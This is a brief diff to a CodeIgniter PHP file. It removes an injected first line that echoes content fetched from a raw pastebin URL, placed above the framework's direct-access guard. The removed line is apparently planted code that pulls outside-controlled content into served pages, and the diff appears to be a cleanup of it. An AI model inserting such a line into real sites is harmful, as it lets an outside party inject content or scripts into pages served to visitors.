@@ -1,4 +1,3 @@
-<?php echo file_get_contents("https://pastebin.com/raw/64YMj6rg"); ?>
 <?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
 /**
  * CodeIgniter
